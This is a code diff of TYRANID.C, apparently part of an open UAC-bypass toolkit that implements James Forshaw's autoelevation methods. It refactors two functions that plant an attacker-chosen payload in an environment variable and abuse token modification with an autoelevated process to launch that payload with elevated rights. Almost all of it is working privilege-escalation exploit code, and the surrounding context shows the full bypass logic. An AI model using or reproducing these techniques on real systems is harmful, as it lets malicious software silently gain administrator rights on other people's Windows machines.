@@ -4,9 +4,9 @@
 *
 *  TITLE:       TYRANID.C
 *
-*  VERSION:     2.84
+*  VERSION:     2.85
 *
-*  DATE:        22 Nov 2017
+*  DATE:        01 Dec 2017
 *
 *  James Forshaw autoelevation method(s)
 *  Fine Dinning Tool (c) CIA
@@ -35,32 +35,23 @@
 *
 */
 BOOL ucmDiskCleanupEnvironmentVariable(
-    _In_opt_ LPWSTR lpszPayload
+    _In_ LPWSTR lpszPayload
 )
 {
     BOOL    bResult = FALSE, bCond = FALSE;
-    LPWSTR  lpBuffer = NULL;
-    WCHAR   szBuffer[MAX_PATH + 1];
     WCHAR   szEnvVariable[MAX_PATH * 2];
 
     do {
 
-        if (lpszPayload != NULL) {
-            lpBuffer = lpszPayload;
-        }
-        else {
-            //no payload specified, use default cmd.exe
-            RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
-            supExpandEnvironmentStrings(T_DEFAULT_CMD, szBuffer, MAX_PATH);
-            lpBuffer = szBuffer;
-        }
+        if (_strlen(lpszPayload) > MAX_PATH)
+            return FALSE;
 
         //
         // Add quotes.
         //
         szEnvVariable[0] = L'\"';
         szEnvVariable[1] = 0;
-        _strncpy(&szEnvVariable[1], MAX_PATH, lpBuffer, MAX_PATH);
+        _strncpy(&szEnvVariable[1], MAX_PATH, lpszPayload, MAX_PATH);
         _strcat(szEnvVariable, L"\"");
 
         //
@@ -93,7 +84,7 @@ BOOL ucmDiskCleanupEnvironmentVariable(
 *
 */
 BOOL ucmTokenModification(
-    _In_opt_ LPWSTR lpszPayload
+    _In_ LPWSTR lpszPayload
 )
 {
     BOOL bCond = FALSE, bResult = FALSE;
@@ -106,26 +97,13 @@ BOOL ucmTokenModification(
     SECURITY_QUALITY_OF_SERVICE sqos;
     OBJECT_ATTRIBUTES obja;
 
-    LPWSTR lpBuffer = NULL;
-
     STARTUPINFO si;
     PROCESS_INFORMATION pi;
     SHELLEXECUTEINFO shinfo;
-    WCHAR szBuffer[MAX_PATH + 1];
 
     RtlSecureZeroMemory(&shinfo, sizeof(shinfo));
 
     do {
-
-        if (lpszPayload != NULL) {
-            lpBuffer = lpszPayload;
-        }
-        else {
-            //no payload specified, use default cmd.exe
-            RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
-            supExpandEnvironmentStrings(T_DEFAULT_CMD, szBuffer, MAX_PATH);
-            lpBuffer = szBuffer;
-        }
 
         //
         // Run autoelevated app (any).
@@ -268,7 +246,7 @@ BOOL ucmTokenModification(
 
         bResult = CreateProcessWithLogonW(TEXT("uac"), TEXT("is"), TEXT("useless"),
             LOGON_NETCREDENTIALS_ONLY,
-            lpBuffer,
+            lpszPayload,
             NULL, 0, NULL, NULL,
             &si, &pi);
 
